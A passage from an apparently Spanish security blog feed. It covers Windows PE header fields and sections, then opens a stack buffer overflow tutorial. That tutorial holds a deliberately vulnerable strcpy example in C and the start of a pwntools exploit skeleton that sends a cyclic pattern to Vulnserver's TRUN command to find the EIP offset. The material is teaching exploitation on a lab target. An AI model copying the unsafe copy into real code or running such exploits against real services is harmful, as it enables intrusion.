&lt;li&gt;&lt;strong&gt;&lt;code&gt;0x107&lt;&#x2F;code&gt;:&lt;&#x2F;strong&gt; Identifica la imagen como una imagen ROM.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;MajorOperatingSystemVersion&lt;&#x2F;strong&gt; – El número de versión mayor del sistema operativo requerido (por ejemplo, 11, 10).&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;MinorOperatingSystemVersion&lt;&#x2F;strong&gt; – El número de versión menor del sistema operativo requerido (por ejemplo, 1511, 1507, 1607).&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;SizeOfCode&lt;&#x2F;strong&gt; – El tamaño de la sección &lt;code&gt;.text&lt;&#x2F;code&gt; (se discutirá más adelante).&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;AddressOfEntryPoint&lt;&#x2F;strong&gt; – Desplazamiento hacia el punto de entrada del archivo (normalmente la función principal).&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;BaseOfCode&lt;&#x2F;strong&gt; – Desplazamiento hacia el inicio de la sección &lt;code&gt;.text&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;SizeOfImage&lt;&#x2F;strong&gt; – El tamaño total del archivo de imagen en bytes.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;ImageBase&lt;&#x2F;strong&gt; – Especifica la dirección preferida en la que la aplicación debe cargarse en memoria cuando se ejecute. Sin embargo, debido a los mecanismos de protección de memoria de Windows, como la &lt;strong&gt;Randomización del Diseño del Espacio de Direcciones (ASLR)&lt;&#x2F;strong&gt;, es raro ver una imagen mapeada en su dirección preferida, ya que el cargador de &lt;code&gt;PE&lt;&#x2F;code&gt; de Windows mapea el archivo en una dirección diferente.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;DataDirectory&lt;&#x2F;strong&gt; – Uno de los miembros más importantes en el encabezado opcional. Este es un arreglo de &lt;code&gt;IMAGE_DATA_DIRECTORY&lt;&#x2F;code&gt;, que contiene los directorios en un archivo &lt;code&gt;PE&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c&quot; class=&quot;language-c z-code&quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-storage z-type z-c&quot;&gt;typedef&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-c&quot;&gt;struct&lt;&#x2F;span&gt; _IMAGE_DATA_DIRECTORY &lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-begin z-c&quot;&gt;{&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;   &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;   VirtualAddress&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;   &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;   &lt;span class=&quot;z-support z-type z-mac-classic z-c&quot;&gt;Size&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-end z-c&quot;&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; IMAGE_DATA_DIRECTORY&lt;span class=&quot;z-punctuation z-separator z-c&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-c&quot;&gt;*&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-type z-typedef z-c&quot;&gt;PIMAGE_DATA_DIRECTORY&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;El array Data Directory tiene un tamaño de &lt;code&gt;IMAGE_NUMBEROF_DIRECTORY_ENTRIES&lt;&#x2F;code&gt;, que es un valor constante de &lt;strong&gt;16&lt;&#x2F;strong&gt;. Cada elemento del arreglo representa un directorio de datos específico, que incluye información sobre una sección de &lt;code&gt;PE&lt;&#x2F;code&gt; o una tabla de Datos (el lugar donde se guarda información específica sobre el &lt;code&gt;PE&lt;&#x2F;code&gt;).&lt;&#x2F;p&gt;
&lt;h3 id=&quot;directorios-de-importacion-e-iat&quot;&gt;Directorios de importación e IAT&lt;a class=&quot;zola-anchor&quot; href=&quot;#directorios-de-importacion-e-iat&quot; aria-label=&quot;Anchor link for: directorios-de-importacion-e-iat&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;El directorio de exportación de un archivo &lt;code&gt;PE&lt;&#x2F;code&gt; es una estructura de datos que contiene información sobre las funciones y variables que son exportadas desde el ejecutable.&lt;&#x2F;p&gt;
&lt;p&gt;Contiene las direcciones de las funciones y variables exportadas, que pueden ser utilizadas por otros archivos ejecutables para acceder a esas funciones y datos. El directorio de exportación generalmente se encuentra en archivos &lt;code&gt;DLL&lt;&#x2F;code&gt; que exportan funciones (por ejemplo, &lt;code&gt;kernel32.dll&lt;&#x2F;code&gt; exportando &lt;code&gt;CreateFileA&lt;&#x2F;code&gt;).&lt;&#x2F;p&gt;
&lt;p&gt;La tabla de direcciones de importación (IAT) es una estructura de datos en un archivo &lt;code&gt;PE&lt;&#x2F;code&gt; que contiene información sobre las direcciones de las funciones importadas desde otros archivos ejecutables. Las direcciones se utilizan para acceder a las funciones y datos en los otros ejecutables.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;secciones-de-un-formato-pe&quot;&gt;Secciones de un formato PE&lt;a class=&quot;zola-anchor&quot; href=&quot;#secciones-de-un-formato-pe&quot; aria-label=&quot;Anchor link for: secciones-de-un-formato-pe&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;Las secciones de un archivo PE contienen el código y los datos utilizados para crear un programa ejecutable. Cada sección PE tiene un nombre único y generalmente contiene código ejecutable, datos o información de recursos.&lt;&#x2F;p&gt;
&lt;p&gt;No existe un número constante de secciones PE porque diferentes compiladores pueden agregar, eliminar o combinar secciones dependiendo de la configuración.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;encabezado-pe&#x2F;2-sections.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;.text&lt;&#x2F;strong&gt;: Contiene el código ejecutable, es decir, el código escrito.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;.data&lt;&#x2F;strong&gt;: Contiene datos inicializados, que son variables inicializadas en el código.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;.rdata&lt;&#x2F;strong&gt;: Contiene datos de solo lectura. Estas son variables constantes precedidas por &lt;code&gt;const&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;.idata&lt;&#x2F;strong&gt;: Contiene las tablas de importación. Son tablas de información relacionadas con las funciones que se llaman usando el código. Esto es utilizado por el cargador de &lt;code&gt;PE&lt;&#x2F;code&gt; de Windows para determinar qué archivos &lt;code&gt;DLL&lt;&#x2F;code&gt; cargar en el proceso, junto con qué funciones se están utilizando de cada &lt;code&gt;DLL&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;.reloc&lt;&#x2F;strong&gt;: Contiene información sobre cómo corregir las direcciones de memoria para que el programa pueda cargarse en memoria sin errores.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;.rsrc&lt;&#x2F;strong&gt;: Se usa para almacenar recursos como iconos y mapas de bits.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;referencias&quot;&gt;Referencias&lt;a class=&quot;zola-anchor&quot; href=&quot;#referencias&quot; aria-label=&quot;Anchor link for: referencias&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;https:&#x2F;&#x2F;learn.microsoft.com&#x2F;es-es&#x2F;windows&#x2F;win32&#x2F;debug&#x2F;pe-format&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Stack-Based Buffer Overflow</title>
		<published>2025-11-11T00:00:00+00:00</published>
		<updated>2025-11-11T00:00:00+00:00</updated>
		<link rel="alternate" type="text/html" href="https://example.com/posts/stack-based/"/>
		<id>https://example.com/posts/stack-based/</id>
    
		<content type="html" xml:base="https://example.com/posts/stack-based/">&lt;p&gt;Un desbordamiento de &lt;strong&gt;Búfer&lt;&#x2F;strong&gt; basado en la pila, ocurre cuando un programa asigna un tamaño de memoria X, y este es sobrepasado por la cantidad de información que se manda, pudiendo sobrescribir parte de la memoria adyacente.&lt;&#x2F;p&gt;
&lt;p&gt;El siguiente snippet de código muestra un ejemplo de como un búfer tiene un tamaño estático.&lt;&#x2F;p&gt;
&lt;p&gt;La función principal define primero una matriz de caracteres llamada buffer con capacidad para hasta 80 caracteres. Dado que esta variable está definida dentro de una función, el compilador la tratará como una variable local y se la reservará un tamaño de 80 bytes en la pila.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c&quot; class=&quot;language-c z-code&quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-preprocessor z-include z-c&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-include z-c&quot;&gt;#include&lt;&#x2F;span&gt; &lt;span class=&quot;z-string z-quoted z-other z-lt-gt z-include z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-c&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;stdio.h&lt;span class=&quot;z-punctuation z-definition z-string z-end z-c&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-preprocessor z-include z-c&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-include z-c&quot;&gt;#include&lt;&#x2F;span&gt; &lt;span class=&quot;z-string z-quoted z-other z-lt-gt z-include z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-c&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;string.h&lt;span class=&quot;z-punctuation z-definition z-string z-end z-c&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-storage z-type z-c&quot;&gt;int&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function z-c&quot;&gt;&lt;span class=&quot;z-entity z-name z-function z-c&quot;&gt;main&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c&quot;&gt;&lt;span class=&quot;z-meta z-group z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-c&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c&quot;&gt;&lt;span class=&quot;z-meta z-group z-c&quot;&gt;&lt;span class=&quot;z-storage z-type z-c&quot;&gt;int&lt;&#x2F;span&gt; &lt;span class=&quot;z-variable z-parameter z-c&quot;&gt;argc&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-c&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-c&quot;&gt;char&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-c&quot;&gt;*&lt;&#x2F;span&gt; &lt;span class=&quot;z-variable z-parameter z-c&quot;&gt;argv&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-brackets z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-c&quot;&gt;[&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-c&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-c&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-c&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-function z-c&quot;&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-begin z-c&quot;&gt;{&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-function z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;	buffer&lt;span class=&quot;z-meta z-brackets z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-c&quot;&gt;[&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-c&quot;&gt;80&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-c&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-function z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-function z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;	&lt;span class=&quot;z-keyword z-control z-c&quot;&gt;if&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-group z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-c&quot;&gt;(&lt;&#x2F;span&gt;argc &lt;span class=&quot;z-keyword z-operator z-comparison z-c&quot;&gt;&amp;lt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-c&quot;&gt;2&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-c&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-function z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;	&lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-begin z-c&quot;&gt;{&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-function z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;		&lt;span class=&quot;z-meta z-function-call z-c&quot;&gt;&lt;span class=&quot;z-support z-function z-C99 z-c&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-group z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-c&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-c&quot;&gt;&lt;span class=&quot;z-meta z-group z-c&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-c&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;Error: debe proporcionar al menos un argumento&lt;span class=&quot;z-constant z-character z-escape z-c&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-c&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-c&quot;&gt;&lt;span class=&quot;z-meta z-group z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-c&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-function z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;		&lt;span class=&quot;z-keyword z-control z-flow z-return z-c&quot;&gt;return&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-c&quot;&gt;1&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-function z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;	&lt;span class=&quot;z-punctuation z-section z-block z-end z-c&quot;&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-function z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-function z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;	&lt;span class=&quot;z-meta z-function-call z-c&quot;&gt;&lt;span class=&quot;z-support z-function z-C99 z-c&quot;&gt;strcpy&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-group z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-c&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-c&quot;&gt;&lt;span class=&quot;z-meta z-group z-c&quot;&gt;buffer&lt;span class=&quot;z-punctuation z-separator z-c&quot;&gt;,&lt;&#x2F;span&gt; argv&lt;span class=&quot;z-meta z-brackets z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-c&quot;&gt;[&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-c&quot;&gt;1&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-c&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-c&quot;&gt;&lt;span class=&quot;z-meta z-group z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-c&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-function z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;	&lt;span class=&quot;z-keyword z-control z-flow z-return z-c&quot;&gt;return&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-c&quot;&gt;0&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-function z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-end z-c&quot;&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;El programa procede entonces a copiar (strcpy) el contenido del argumento de línea de comandos dado &lt;code&gt;argv[1]&lt;&#x2F;code&gt; en la matriz de caracteres del búfer. Finalmente, el programa finaliza su ejecución y devuelve cero (código de salida exitosa estándar) al sistema operativo.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;como-se-explota-un-buffer-overflow&quot;&gt;Cómo se explota un Buffer overflow&lt;a class=&quot;zola-anchor&quot; href=&quot;#como-se-explota-un-buffer-overflow&quot; aria-label=&quot;Anchor link for: como-se-explota-un-buffer-overflow&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;Obviando la parte de ingeniería inversa para detectar la vulnerabilidad, se tomará de ejemplo &quot;Vulnserver&quot;,en concreto abusaremos de la función TRUN.&lt;&#x2F;p&gt;
&lt;p&gt;Mandamos un patrón de caracteres que no se repiten para saber cual es el offset exacto en el se empieza a sobrescribir EIP.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;controlando-eip&quot;&gt;Controlando EIP&lt;a class=&quot;zola-anchor&quot; href=&quot;#controlando-eip&quot; aria-label=&quot;Anchor link for: controlando-eip&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;El esqueleto del exploit, es el siguiente, primero se establece una conexión el servidor a la escucha y después se manda un patrón de 3000 caracteres.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-from z-python&quot;&gt;from&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-meta z-import-source z-python&quot;&gt; &lt;span class=&quot;z-meta z-import-path z-python&quot;&gt;&lt;span class=&quot;z-meta z-import-name z-python&quot;&gt;pwn&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-python&quot;&gt;import&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt; &lt;span class=&quot;z-constant z-language z-import-all z-python&quot;&gt;*&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;p&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;remote&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;192.168.1.131&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;9999&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; 3000
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;payload&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4...&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
